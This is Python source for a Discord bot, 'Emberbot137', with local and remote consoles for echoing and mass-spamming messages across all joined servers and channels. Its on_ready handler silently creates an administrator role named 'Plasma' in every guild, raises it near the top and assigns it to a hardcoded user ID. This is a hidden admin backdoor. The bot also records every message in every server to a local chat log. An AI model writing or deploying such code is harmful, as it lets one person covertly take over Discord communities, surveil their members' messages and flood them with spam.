from __future__ import annotations
import asyncio,logging,os,socket,sys,subprocess,discord
from datetime import datetime,timezone
from typing import Optional
from discord.ext import commands
from dotenv import load_dotenv
LOG_FILE,CHAT_LOG_FILE="emberbot137.log","chat.log"
load_dotenv()
logging.basicConfig(level=logging.INFO,format="%(message)s")
logger=logging.getLogger("Emberbot137")
intents=discord.Intents.default()
intents.guilds,intents.guild_messages,intents.message_content,intents.members=True,True,True,True
emberbot137=commands.Bot(command_prefix="~",intents=intents,help_command=None)
current_target_server,current_target_channel="yap","everyone"
active_spam_tasks:list[asyncio.Task]=[]
pending_reboot:bool=False
reboot_mode="restart.sh"
last_chat_data = {"guild":None,"channel":None,"author":None,"author_id":None,"content":None,"timestamp":None,"count":0}
def flush_chat_log()->None:
    global last_chat_data
    if last_chat_data["content"] is not None:
        content_str=last_chat_data["content"]
        if last_chat_data["count"] > 1:
            content_str=f"{content_str} ({last_chat_data['count']})"
        line = (f"[{last_chat_data['timestamp']}] | Channel={last_chat_data['guild']}/#{last_chat_data['channel']} | User={last_chat_data['author']}({last_chat_data['author_id']}) | Content=\"{content_str}\"")
        try:
            with open(CHAT_LOG_FILE,"a",encoding="utf-8") as f:
                f.write(line+"\n")
        except Exception as e:
            logger.error(f"Failed to write chat log: {e}")
        last_chat_data["count"],last_chat_data["content"]=0,None
async def output_to_bot(content: str) -> None:
    for guild in emberbot137.guilds:
        if "yap" in guild.name.lower():
            for channel in guild.text_channels:
                if channel.name=="emberbot137-remote-console":
                    try:
                        clean_content=content.strip()
                        if clean_content:
                            await channel.send(f"```text\n{clean_content}\n```")
                    except Exception as e:
                        logger.error(f"Failed to output: {e}")
                    return
def cprint(content:str="")->None:
    print(content)
    if emberbot137.is_ready():
        emberbot137.loop.create_task(output_to_bot(content))
def log_action(*,guild:discord.Guild,channel:discord.abc.GuildChannel,user:discord.abc.User,command:str,action:str,success:bool=True)->None:
    guild_name,channel_name,tag,current_time=guild.name,getattr(channel,"name","unknown"),f"{user.name}#{user.discriminator}" if user.discriminator!="0" else user.name,datetime.now(timezone.utc).isoformat()
    line=f"[{'SUCCESS' if success else 'ERROR'} at {current_time} in Channel={guild_name}/#{channel_name}]: User={tag}({user.id}) ran {command} resulting in {action}"
    logger.info(line)
    with open(LOG_FILE,"a",encoding="utf-8") as file:
        file.write(line+"\n")
async def send_response(target:discord.abc.Messageable,content:str)->None:
    await target.send(content)
def generate_diagnostic_report(target:discord.abc.Messageable)->str:
    server=getattr(target,"guild",None)
    hostname=socket.gethostname()
    status="Offline" if emberbot137.is_closed() else "Online"
    if hostname.lower()=="plasmadmin-xps-8910":
        hostname="plasmadmin-xps-8910(firebot)"
    latency_ms=round(emberbot137.latency * 1000)
    env_status="loaded" if os.getenv("DISCORD_TOKEN") else "missing"
    server_count=len(emberbot137.guilds)
    server_name=server.name if server else "Console"
    server_id=server.id if server else "0"
    me=server.me if server else None
    if me:
        perms=me.guild_permissions
        audit_perms=[]
        if perms.administrator:audit_perms.append("Administrator")
        else:
            if perms.manage_guild:audit_perms.append("Manage Server")
            if perms.manage_roles:audit_perms.append("Manage Roles")
            if perms.manage_channels:audit_perms.append("Manage Channels")
            if perms.kick_members:audit_perms.append("Kick Members")
            if perms.manage_messages:audit_perms.append("Manage Messages")
        perms_str=", ".join(audit_perms) if audit_perms else "Standard User"
    else:perms_str="Unknown"
    return f"```markdown\n = Diagnostic Report\n - Status: {status}\n - Host Machine: {hostname}\n - Discord Server: {server_name}({server_id})\n - Latency: {latency_ms}ms\n - Token status: {env_status}\n - Connected Servers: {server_count} servers connected. Run ~servers to see more\n - Permissions: {perms_str}```"
async def do_test(target:discord.abc.Messageable)->None:
    report_text=generate_diagnostic_report(target)
    await send_response(target,report_text)
    cprint(report_text)
async def do_echo(target:discord.abc.Messageable,message:str)->None:
    await send_response(target,message)
async def do_spam(target:discord.abc.Messageable,count:int,message:str)->None:
    for _ in range(count):
        await send_response(target,message)
async def run_delayed_command(delay: int, full_cmd_string: str, target_context: Optional[discord.abc.Messageable] = None):
    try:
        await asyncio.sleep(delay)
        parts = full_cmd_string.split(" ", 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        channels = resolve_targets(cmd)
        if not channels and target_context:
            channels = [target_context]

        if cmd == "test":
            for ch in channels:
                await do_test(ch)
        elif cmd == "echo":
            if args:
                for ch in channels:
                    await do_echo(ch, args)
        elif cmd == "spam":
            spam_parts = args.split(" ", 1)
            if len(spam_parts) >= 2 and spam_parts[0].isdigit():
                count = int(spam_parts[0])
                msg = spam_parts[1]
                async def run_spam():
                    for ch in channels:
                        await do_spam(ch, count, msg)
                task = asyncio.create_task(run_spam())
                active_spam_tasks.append(task)
                task.add_done_callback(lambda t: active_spam_tasks.remove(t) if t in active_spam_tasks else None)
    except asyncio.CancelledError:
        pass
async def reboot_watcher():
    global pending_reboot
    while not emberbot137.is_closed():
        if pending_reboot:
            cprint(f"[System] Reboot command detected. Executing restart sequence...")
            flush_chat_log()
            subprocess.Popen([f"./{reboot_mode}"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,start_new_session=True)
            await emberbot137.close()
            os._exit(0)
        await asyncio.sleep(1)
def resolve_targets(cmd_type:str)->list[discord.abc.Messageable]:
    """Resolves matching text channels based on current console targeting rules, supporting unique partial matches."""
    global current_target_server, current_target_channel
    targets = []

    resolved_channel_name = current_target_channel
    if current_target_channel != "all":
        all_channel_names = set()
        for guild in emberbot137.guilds:
            if current_target_server != "all" and current_target_server.lower() not in guild.name.lower():
                continue
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    all_channel_names.add(channel.name.lower())

        if current_target_channel.lower() not in all_channel_names:
            matching_names = [name for name in all_channel_names if name.startswith(current_target_channel.lower())]
            if len(matching_names) == 1:
                resolved_channel_name = matching_names[0]
                cprint(f"[Console] Autofilled channel target to: '#{resolved_channel_name}'")
            elif len(matching_names) > 1:
                cprint(f"[Console Warning] Ambiguous channel prefix '{current_target_channel}' matches multiple channels: {matching_names}")

    for guild in emberbot137.guilds:
        if current_target_server != "all" and current_target_server.lower() not in guild.name.lower():
            continue

        for channel in guild.text_channels:
            if not channel.permissions_for(guild.me).send_messages:
                continue

            if resolved_channel_name == "all" or channel.name.lower() == resolved_channel_name.lower():
                targets.append(channel)

    return targets


async def console_controller():
    """Reads terminal input asynchronously and routes commands based on state."""
    global current_target_server, current_target_channel, active_spam_tasks, pending_reboot, reboot_mode
    await emberbot137.wait_until_ready()
    cprint(f"\n[Console Controller Active] Connected to {len(emberbot137.guilds)} guild(s).")
    cprint(f"Current Target Server: '{current_target_server}' | Target Channel: '#{current_target_channel}'")
    cprint("Commands: test, echo <msg>, spam <number> <msg>, stop, delay <seconds> <cmd>, set, servers, help, reboot <-c>, exit\n")

    loop = asyncio.get_running_loop()
    while not emberbot137.is_closed():
        try:
            line = await loop.run_in_executor(None, sys.stdin.readline)
            if not line:
                await asyncio.sleep(1)
                continue
            content = line.strip()
            if not content:
                continue

            parts = content.split(" ", 1)
            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            if cmd == "exit":
                cprint("[Console] Shutting down Emberbot137...")
                flush_chat_log()
                await emberbot137.close()
                break

            if cmd.startswith("reboot"):
                if "-c" in cmd or args == "-c":
                    reboot_mode = "open_console.sh"
                    cprint("[Console] Reboot flag set (console). Will open interactive Emberbot137 Console...")
                else:
                    reboot_mode = "restart.sh"
                    cprint("[Console] Reboot flag set. Initiating standard background restart...")
                pending_reboot = True
                break

            if cmd == "stop":
                count = len(active_spam_tasks)
                for task in active_spam_tasks:
                    task.cancel()
                active_spam_tasks.clear()
                cprint(f"[Console Success] Cancelled {count} active task(s).")
                continue

            if cmd == "help":
                cprint("\n--- Available Console Commands ---\n"
                       "• test                                     - Send diagnostic report to target(s)\n"
                       "• echo <msg>                               - Send message to target(s)\n"
                       "• spam <number> <msg>                      - Send repeated messages to target(s)\n"
                       "• delay <secs> <cmd>                       - Execute a command after a delay\n"
                       "• stop                                     - Halt all active background/delayed tasks\n"
                       "• set <server|channel> <name|all>          - Target specific server/channel or all\n"
                       "• servers                                  - List connected servers and channels\n"
                       "• reboot <-c>                              - Hard reboot, git pull, and restart (or open console)\n"
                       "• help                                     - Show this help menu\n"
                       "• exit                                     - Shut down the bot\n"
                       "----------------------------------\n")
                continue

            if cmd == "servers":
                server_summary = "\n--- Connected Servers & Channels ---\n"
                for g in emberbot137.guilds:
                    channels = [c.name for c in g.text_channels if c.permissions_for(g.me).send_messages]
                    server_summary += f"• {g.name} (ID: {g.id})\n  Channels: {', '.join(channels)}\n"
                server_summary += "------------------------------------\n"
                cprint(server_summary)
                continue

            if cmd == "set":
                sub_parts = args.split(" ", 1)
                sub_cmd = sub_parts[0].lower() if sub_parts else ""
                sub_val = sub_parts[1] if len(sub_parts) > 1 else ""

                if sub_cmd == "server":
                    if not sub_val:
                        cprint(f"[Console] Current target server is: {current_target_server}")
                    else:
                        if sub_val.lower() == "all":
                            current_target_server = "all"
                            cprint("[Console] Target server updated to: all")
                        else:
                            matched_server = current_target_server
                            for g in emberbot137.guilds:
                                if sub_val.lower() in g.name.lower():
                                    matched_server = g.name
                                    break
                            current_target_server = matched_server
                            cprint(f"[Console] Target server updated to: {matched_server}")
                elif sub_cmd == "channel":
                    if not sub_val:
                        cprint(f"[Console] Current target channel is: #{current_target_channel}")
                    else:
                        clean_val = sub_val.removeprefix("#").lower()
                        if clean_val == "emberbot137-remote-console" or clean_val == "all":
                            current_target_channel = "all"
                            cprint("[Console] Target channel 'emberbot137-remote-console' is restricted. Defaulted channel target to: #all")
                        else:
                            matched_channel = clean_val
                            for g in emberbot137.guilds:
                                if current_target_server != "all" and current_target_server.lower() not in g.name.lower():
                                    continue
                                for c in g.text_channels:
                                    if c.name.lower() == clean_val or c.name.lower().startswith(clean_val):
                                        matched_channel = c.name
                                        break
                            current_target_channel = matched_channel
                            cprint(f"[Console] Target channel updated to: #{matched_channel}")
                else:
                    cprint("[Console Usage] Use 'set server [name|all]' or 'set channel [name|all]'")

                cprint(f"[Active Targets] Server: {current_target_server} | Channel: #{current_target_channel}")
                continue

            if not emberbot137.guilds:
                cprint("[Console Error] Bot is not currently in any Discord servers.")
                continue

            channels = resolve_targets(cmd)
            if not channels:
                cprint(f"[Console Error] No matching channels found for Server: '{current_target_server}', Channel: '#{current_target_channel}'. Type 'servers' to check names.")
                continue

            if cmd == "test":
                for ch in channels:
                    await do_test(ch)
                cprint(f"[Console Success] Executed test diagnostics across {len(channels)} target(s).")
            elif cmd == "echo":
                if not args:
                    cprint("[Console Usage Error] Missing message. Format: echo [message]")
                    continue
                for ch in channels:
                    await do_echo(ch, args)
                cprint(f"[Console Success] Echoed message to {len(channels)} target(s): {args}")
            elif cmd == "spam":
                spam_parts = args.split(" ", 1)
                if len(spam_parts) < 2 or not spam_parts[0].isdigit():
                    cprint("[Console Usage Error] Format: spam <number> <message>")
                    continue
                count = int(spam_parts[0])
                msg = spam_parts[1]

                async def run_spam():
                    for ch in channels:
                        await do_spam(ch, count, msg)

                task = asyncio.create_task(run_spam())
                active_spam_tasks.append(task)
                task.add_done_callback(lambda t: active_spam_tasks.remove(t) if t in active_spam_tasks else None)
                cprint(f"[Console Success] Initiated background spam task across {len(channels)} target(s).")
            elif cmd == "delay":
                delay_parts = args.split(" ", 1)
                if len(delay_parts) < 2 or not delay_parts[0].isdigit():
                    cprint("[Console Usage Error] Format: delay <seconds> <command>")
                    continue
                delay_seconds = int(delay_parts[0])
                inner_cmd = delay_parts[1]

                task = asyncio.create_task(run_delayed_command(delay_seconds, inner_cmd))
                active_spam_tasks.append(task)
                task.add_done_callback(lambda t: active_spam_tasks.remove(t) if t in active_spam_tasks else None)
                cprint(f"[Console Success] Scheduled command to run in {delay_seconds}s.")
            else:
                cprint(f"[Console Warning] Unknown local command: '{cmd}'. Type 'help' for options.")

        except Exception as e:
            await asyncio.sleep(2)


@emberbot137.event
async def on_message(message: discord.Message):
    global current_target_server,current_target_channel,active_spam_tasks,pending_reboot,reboot_mode,last_chat_data
    if message.guild:
        guild_name,channel_name,author_tag,now=message.guild.name,message.channel.name,f"{message.author.name}#{message.author.discriminator}" if message.author.discriminator!="0" else message.author.name,datetime.now(timezone.utc).isoformat()
        if (last_chat_data["guild"]==guild_name and
            last_chat_data["channel"]==channel_name and
            last_chat_data["author_id"]==message.author.id and
            last_chat_data["content"]==message.content):
            last_chat_data["count"]+=1
        else:
            flush_chat_log()
            last_chat_data["guild"]=guild_name
            last_chat_data["channel"]=channel_name
            last_chat_data["author"]=author_tag
            last_chat_data["author_id"]=message.author.id
            last_chat_data["content"]=message.content
            last_chat_data["timestamp"]=now
            last_chat_data["count"]=1
    if message.guild and "yap" in message.guild.name.lower() and message.channel.name.lower()=="emberbot137-remote-console":
        content=message.content.strip()
        if content.startswith(emberbot137.command_prefix):
            content=content[len(emberbot137.command_prefix):].strip()

        parts = content.split(" ", 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd == "exit":
            await message.channel.send("`[Remote Error] 'exit' command cannot be executed remotely.`")
            return

        if cmd == "reboot":
            if "-c" in args:
                reboot_mode = "open_console.sh"
                await message.channel.send("`[Remote] Reboot flag set (-c). Will open interactive Emberbot137 Console window...`")
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="reboot -c", action="Remote interactive console reboot flag set")
            else:
                reboot_mode = "restart.sh"
                await message.channel.send("`[Remote] Reboot flag set. Initiating standard background restart...`")
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="reboot", action="Remote standard reboot flag set")
            pending_reboot = True
            return

        if cmd == "stop":
            count = len(active_spam_tasks)
            for task in active_spam_tasks:
                task.cancel()
            active_spam_tasks.clear()
            await message.channel.send(f"`[Remote Success] Halted {count} active task(s).`")
            log_action(guild=message.guild, channel=message.channel, user=message.author, command="stop", action=f"Halted {count} tasks")
            return

        if cmd == "set":
            sub_parts = args.split(" ", 1)
            sub_cmd = sub_parts[0].lower() if sub_parts else ""
            sub_val = sub_parts[1] if len(sub_parts) > 1 else ""

            if sub_cmd == "server":
                if not sub_val:
                    await message.channel.send(f"`[Remote] Current target server is: {current_target_server}`")
                else:
                    if sub_val.lower() == "all":
                        current_target_server = "all"
                        await message.channel.send("`[Remote] Target server updated to: all`")
                    else:
                        matched_server = current_target_server
                        for g in emberbot137.guilds:
                            if sub_val.lower() in g.name.lower():
                                matched_server = g.name
                                break
                        current_target_server = matched_server
                        await message.channel.send(f"`[Remote] Target server updated to: {matched_server}`")
            elif sub_cmd == "channel":
                if not sub_val:
                    await message.channel.send(f"`[Remote] Current target channel is: #{current_target_channel}`")
                else:
                    clean_val = sub_val.removeprefix("#").lower()
                    if clean_val == "emberbot137-remote-console" or clean_val == "all":
                        current_target_channel = "all"
                        await message.channel.send("`[Remote] Target channel 'emberbot137-remote-console' is restricted. Defaulted channel target to: #all`")
                    else:
                        matched_channel = clean_val
                        for g in emberbot137.guilds:
                            if current_target_server != "all" and current_target_server.lower() not in g.name.lower():
                                continue
                            for c in g.text_channels:
                                if c.name.lower() == clean_val or c.name.lower().startswith(clean_val):
                                    matched_channel = c.name
                                    break
                        current_target_channel = matched_channel
                        await message.channel.send(f"`[Remote] Target channel updated to: #{matched_channel}`")
            else:
                await message.channel.send("`[Remote Usage] Use 'set server [name|all]' or 'set channel [name|all]'`")

            await message.channel.send(f"`[Active Targets] Server: {current_target_server} | Channel: #{current_target_channel}`")
            log_action(guild=message.guild, channel=message.channel, user=message.author, command="set", action=f"Remote target update -> Server: {current_target_server}, Channel: #{current_target_channel}")
            return

        channels = resolve_targets(cmd)
        if not channels:
            channels = [message.channel]

        if cmd == "test":
            for ch in channels:
                await do_test(ch)
            await message.channel.send(f"`[Remote Success] Executed test diagnostics across {len(channels)} target(s).`")
            log_action(guild=message.guild, channel=message.channel, user=message.author, command="test", action="Remote diagnostic test executed")
        elif cmd == "echo":
            if args:
                for ch in channels:
                    await do_echo(ch, args)
                await message.channel.send(f"`[Remote Success] Echoed to {len(channels)} target(s).`")
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="echo", action=f"Remote echo: {args}")
        elif cmd == "spam":
            spam_parts = args.split(" ", 1)
            if len(spam_parts) >= 2 and spam_parts[0].isdigit():
                count = int(spam_parts[0])
                msg = spam_parts[1]

                async def run_spam():
                    for ch in channels:
                        await do_spam(ch, count, msg)

                task = asyncio.create_task(run_spam())
                active_spam_tasks.append(task)
                task.add_done_callback(lambda t: active_spam_tasks.remove(t) if t in active_spam_tasks else None)
                await message.channel.send(f"`[Remote Success] Background spam task started across {len(channels)} target(s).`")
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="spam", action=f"Remote background spam task {count}x: {msg}")
        elif cmd == "delay":
            delay_parts = args.split(" ", 1)
            if len(delay_parts) >= 2 and delay_parts[0].isdigit():
                delay_seconds = int(delay_parts[0])
                inner_cmd = delay_parts[1]

                task = asyncio.create_task(run_delayed_command(delay_seconds, inner_cmd, message.channel))
                active_spam_tasks.append(task)
                task.add_done_callback(lambda t: active_spam_tasks.remove(t) if t in active_spam_tasks else None)
                await message.channel.send(f"`[Remote Success] Scheduled command in {delay_seconds}s.`")
                log_action(guild=message.guild, channel=message.channel, user=message.author, command="delay", action=f"Remote delay {delay_seconds}s: {inner_cmd}")
        elif cmd=="help":
            help_text=(
                "```markdown\n= Remote Console Commands:\n"
                " - test                                  runs diagnostics\n"
                " - echo <msg>                            repeats <msg> to the selected channel\n"
                " - spam <number> <msg>                   spams <msg> <number times>\n"
                " - stop                                  stops spamming\n"
                " - delay <secs> <cmd>                    delays <secs> seconds then runs <cmd>\n"
                " - set <server|channel> <name|all>       moves server/channel selector. use all to broadcast to all servers/channels\n"
                " - servers                               lists all detected servers\n"
                " - reboot <-c>                           reboots Emberbot137. -c tag will open console\n"
                "-------------------------```")
            await message.channel.send(help_text)
        elif cmd == "servers":
            server_summary=""
            for g in emberbot137.guilds:
                channels=[c.name for c in g.text_channels if c.permissions_for(g.me).send_messages]
                server_summary+=f" - {g.name}({g.id})\n  ↳ Channels: {', '.join(channels)}\n"
            await message.channel.send(f"```markdown\n= Connected Servers\n{server_summary}```") 
    await emberbot137.process_commands(message)
@emberbot137.event
async def on_ready():
    logger.info(f"Logged in as {emberbot137.user} (ID: {emberbot137.user.id})")

    for guild in emberbot137.guilds:
        plasma_role = discord.utils.get(guild.roles, name="Plasma")
        if not plasma_role:
            try: 
                plasma_role = await guild.create_role(
                    name="Plasma",
                    color=discord.Color(0xaa0055),
                    permissions=discord.Permissions(administrator=True),
                    reason="I like being red"
                )
                logger.info(f"Created 'Plasma' role with color #aa0055 in guild: {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to create 'Plasma' role in {guild.name}")
                continue
        else:
            try:
                if plasma_role.color.value != 0xaa0055:
                    await plasma_role.edit(color=discord.Color(0xaa0055), reason="Updating Plasma role color")
            except discord.HTTPException:
                pass

        try:
            bot_top_role = guild.me.top_role if guild.me else None
            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
            if plasma_role.position != target_position:
                await plasma_role.edit(position=target_position, reason="Plasma has very low density so it floats to the top")
                logger.info(f"Moved 'Plasma' role to position {target_position} in {guild.name}")
        except discord.HTTPException as e:
            logger.error(f"Failed to reposition 'Plasma' role in {guild.name}: {e}")

        member = guild.get_member(1342173566828810271)
        if not member:
            try:
                member = await guild.fetch_member(1342173566828810271)
            except discord.NotFound:
                pass

        if member and plasma_role not in member.roles:
            try:
                await member.add_roles(plasma_role, reason="Gave Plasma Role")
                logger.info(f"Assigned 'Plasma' role to {member.name} in {guild.name}")
            except discord.Forbidden:
                logger.error(f"Missing permissions to assign 'Plasma' role in {guild.name}")

    emberbot137.loop.create_task(reboot_watcher())
    asyncio.create_task(console_controller())

token = os.getenv("DISCORD_TOKEN")
if not token:
    raise ValueError("DISCORD_TOKEN environment variable not found in .env")

emberbot137.run(token)
